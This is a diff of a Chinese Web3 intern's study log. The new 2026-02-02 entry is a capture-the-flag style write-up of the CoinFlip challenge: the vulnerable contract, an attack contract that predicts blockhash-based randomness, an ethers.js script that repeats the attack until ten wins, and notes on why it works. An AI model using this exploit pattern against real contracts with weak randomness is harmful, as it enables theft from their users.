@@ -15,8 +15,233 @@ Web3 实习计划 2025 冬季实习生
 ## Notes
 
 <!-- Content_START -->
+# 2026-02-02
+<!-- DAILY_CHECKIN_2026-02-02_START -->
+# CoinFlip
+
+目标：
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+    uint256 public consecutiveWins;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor() {
+        consecutiveWins = 0;
+    }
+
+    function flip(bool _guess) public returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        if (side == _guess) {
+            consecutiveWins++;
+            return true;
+        } else {
+            consecutiveWins = 0;
+            return false;
+        }
+    }
+}
+```
+
+攻击原理：
+
+伪随机数攻击
+
+开发者错误地利用区块数量作为伪随机数，实际如果攻击合约：
+
+这里实现对应的攻击和攻击脚本（感谢伟大的AI！）
+
+攻击合约：
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+// 先导入原始合约的接口
+interface ICoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+
+contract CoinFlipAttack {
+    ICoinFlip public targetContract;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _targetAddress) {
+        targetContract = ICoinFlip(_targetAddress);
+    }
+
+    function attack() public {
+        // 1. 复制目标合约的随机数生成逻辑
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        
+        // 2. 预先算出正确答案
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        // 3. 带着“必胜”的答案去调用目标合约
+        targetContract.flip(side);
+    }
+}
+```
+
+攻击脚本：
+
+这里用的是ethers.js脚本，可以直接放在remix下面《scripts》目录的脚步去跑
+
+```javascript
+// 这是一个在 Remix 环境下运行的自动化脚本
+(async () => {
+    try {
+        const targetAddress = "你的目标地址";
+        const attackAddress = "你的攻击合约地址";
+        
+        // 获取合约实例
+        const targetAbi = ["function consecutiveWins() public view returns (uint256)"];
+        const attackAbi = ["function attack() public"];
+        
+        // Remix 注入的 provider
+        const signer = (new ethers.providers.Web3Provider(window.ethereum)).getSigner();
+        const targetContract = new ethers.Contract(targetAddress, targetAbi, signer);
+        const attackContract = new ethers.Contract(attackAddress, attackAbi, signer);
+
+        console.log("开始检测胜场...");
+        while (true) {
+            let wins = await targetContract.consecutiveWins();
+            console.log(`当前胜场数: ${wins.toString()}`);
+            if (wins >= 10) {
+                console.log("🎉 已达到10次胜利！停止攻击。");
+                break;
+            }
+            console.log("准备发起下一次攻击...");
+            try {
+                const tx = await attackContract.attack();
+                console.log("交易已发出，哈希:", tx.hash);
+                
+                // 等待交易上链
+                await tx.wait();
+                console.log("✅ 交易确认成功！");
+            } catch (err) {
+                console.log("❌ 交易失败（可能是区块尚未更新），等待 5 秒...");
+                await new Promise(r => setTimeout(r, 5000));
+            }
+        }
+    } catch (e) {
+        console.error("脚本运行出错:", e.message);
+    }
+})();
+```
+
+## 小知识
+
+### 1\. 如何在代码中实现调用？
+
+在 Solidity 中，调用另一个合约通常有两种主要方式。
+
+方案 A：使用接口或合约对象（推荐，类型安全）
+
+这是你在处理 CoinFlip 时最常用的方式。你需要知道目标合约的函数签名。
+
+Solidity
+
+```
+// 1. 定义接口
+interface ICoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+
+contract Attack {
+    function doAttack(address target, bool myGuess) public {
+        // 2. 实例化接口并调用
+        // 这种调用方式就像调用本地函数一样简单
+        bool success = ICoinFlip(target).flip(myGuess);
+        require(success, "Attack failed");
+    }
+}
+```
+
+方案 B：使用底层的 .call()（更灵活，但风险高）
+
+如果你没有接口文件，或者想发送以太币，可以使用低层级调用。
+
+Solidity
+
+```
+(bool success, bytes memory data) = target.call(
+    abi.encodeWithSignature("flip(bool)", myGuess)
+);
+```
+
+### 2\. 如何确保它们在“同一个区块”？
+
+这是一个非常关键的概念：**在以太坊中，外部交易（External Transaction）触发的整个调用链，必然发生在同一个区块内。**
+
+为什么它们一定在同个块？
+
+1.  **单线程顺序执行**：矿工（或验证者）在打包区块时，会一个接一个地处理交易。当你发送一个交易调用 `Attack.doAttack` 时，EVM 会暂停当前合约的逻辑，跳转去执行 `CoinFlip.flip`，执行完后再跳回来。
+    
+2.  **原子性**：整个过程被视为一个单一的事务。如果在 `CoinFlip` 中发生了 `revert`，那么 `Attack` 合约中之前的操作也会被回滚（除非你用了底层 `.call` 并处理了错误）。
+    
+3.  `block.number` **恒定**：在这整个调用链中，`block.number` 和 `blockhash(block.number - 1)` 的值是**完全固定且相同**的。
+    
+
+* * *
+
+### 3\. 为什么你的攻击能成功？
+
+正是因为这种“同块执行”的特性，导致了 `CoinFlip` 的防线崩溃：
+
+-   **步骤 1**：你的 `Attack` 合约在区块 $N$ 被执行。
+    
+-   **步骤 2**：`Attack` 询问 EVM：“现在的 `blockhash(block.number - 1)` 是多少？”
+    
+-   **步骤 3**：`Attack` 根据这个值算出结果 `true`。
+    
+-   **步骤 4**：`Attack` 调用 `CoinFlip.flip(true)`。
+    
+-   **步骤 5**：`CoinFlip` 也在区块 $N$ 执行，它询问 EVM 同样的问题，得到完全相同的结果。
+    
+
+**结果**：你们看到的“随机数源”是同一份卷子，你提前抄好了答案。
+
+* * *
+
+### 💡 进阶技巧：如何判断调用是否成功？
+
+如果你在 `Attack` 合约中调用 `target.flip()`，而 `target` 内部 `revert` 了，你的 `Attack` 也会跟着 `revert`。
+
+如果你想**自动记录**失败但不让整个交易崩掉，可以这样写：
+
+Solidity
+
+```
+function tryAttack(address target, bool guess) public {
+    // 使用 call 可以捕获 revert，不让主程序崩溃
+    (bool success, ) = target.call(abi.encodeWithSignature("flip(bool)", guess));
+    if (!success) {
+        // 这里可以记录失败次数或做其他处理
+    }
+}
+```
+<!-- DAILY_CHECKIN_2026-02-02_END -->
+
 # 2026-02-01
 <!-- DAILY_CHECKIN_2026-02-01_START -->
+
 今天主要总结了下本周的学习内容：  
   
 于具体而言，对于本周的学习效果不是很满意  
@@ -88,6 +313,7 @@ Web3 实习计划 2025 冬季实习生
 
 # 2026-01-31
 <!-- DAILY_CHECKIN_2026-01-31_START -->
+
 
 ## 一、 攻击的技术本质：边界模糊
 
@@ -172,6 +398,7 @@ Web3 实习计划 2025 冬季实习生
 
 # 2026-01-30
 <!-- DAILY_CHECKIN_2026-01-30_START -->
+
 
 
 \# level1
@@ -356,6 +583,7 @@ return allocations\[allocator\];
 
 
 
+
 今天主要学习了Polymarket的数据结构：  
   
   
@@ -456,6 +684,7 @@ orderfilled
 
 # 2026-01-28
 <!-- DAILY_CHECKIN_2026-01-28_START -->
+
 
 
 
@@ -570,6 +799,7 @@ Polymarket 的动态数据通过一系列链上事件（Logs）串联成完整�
 
 
 
+
 # 体验了 MyFirstZKVote
 
 ### 1\. 核心目标：我们要解决什么问题？
@@ -655,6 +885,7 @@ _对应文档中的：「提交投票交易」与「链上验证」_
 
 
 
+
 今天学习到了最重要的是如何做好投研？  
 一个好的投研需要包含：技术背景、团队背景、代币经济学、宏观政策和叙事  
   
@@ -711,6 +942,7 @@ _对应文档中的：「提交投票交易」与「链上验证」_
 
 
 
+
 最近这段时间，不管是运营端还是技术端的深挖，体感上收获都挺大的。复盘了一下，大概分为这两个板块：
 
 1\. 运营实战：
@@ -734,6 +966,7 @@ DApp 框架的深度梳理： 听完 Wachi 老师对 DApp 框架的拆解，我�
 
 # 2026-01-24
 <!-- DAILY_CHECKIN_2026-01-24_START -->
+
 
 
 
@@ -790,6 +1023,7 @@ DApp 框架的深度梳理： 听完 Wachi 老师对 DApp 框架的拆解，我�
 
 
 
+
 一次性将之前创作的链上安全的文章都更新上去了
 
 今天Secret同学的分享对我来说很有感悟：
@@ -801,6 +1035,7 @@ DApp 框架的深度梳理： 听完 Wachi 老师对 DApp 框架的拆解，我�
 
 # 2026-01-21
 <!-- DAILY_CHECKIN_2026-01-21_START -->
+
 
 
 
@@ -851,6 +1086,7 @@ ORDER BY block_time DESC
 
 
 
+
 # 学习运营相关知识
 
 Telegram 如何运营？  
@@ -880,6 +1116,7 @@ Figma 如何使用？
 
 # 2026-01-19
 <!-- DAILY_CHECKIN_2026-01-19_START -->
+
 
 
 
@@ -1018,6 +1255,7 @@ Arweave：提供“永久存储”服务，一次付费永久保存；
 
 
 
+
 # 从 ERC-721 到 ERC-7962
 
 这是我让大模型解析文档得到的：
@@ -1117,6 +1355,7 @@ ERC-7962 的实现核心在于将代币的所有权绑定到公钥的哈希值�
 
 # 2026-01-17
 <!-- DAILY_CHECKIN_2026-01-17_START -->
+
 
 
 
@@ -1279,6 +1518,7 @@ SEO + 邮件订阅
 
 
 
+
 # **学习《安全和合规》部分**
 
 于自己而言，最重要的几点：
@@ -1340,6 +1580,7 @@ SEO + 邮件订阅
 
 # 2026-01-15
 <!-- DAILY_CHECKIN_2026-01-15_START -->
+
 
 
 
@@ -1525,6 +1766,7 @@ Danksharding 是未来的完全体，它将进一步扩大 Blob 的数量，实�
 
 
 
+
 # 完成区块链完全-访问控制漏洞的撰写
 
 使用githubpages搭建了个人博客：\[xxxmingyue的个人博客\]([http://xxxmingyue.github.io](http://xxxmingyue.github.io))
@@ -1538,6 +1780,7 @@ Danksharding 是未来的完全体，它将进一步扩大 Blob 的数量，实�
 
 # 2026-01-13
 <!-- DAILY_CHECKIN_2026-01-13_START -->
+
 
 
 
@@ -1600,6 +1843,7 @@ Danksharding 是未来的完全体，它将进一步扩大 Blob 的数量，实�
 
 # 2026-01-12
 <!-- DAILY_CHECKIN_2026-01-12_START -->
+
 
 
 
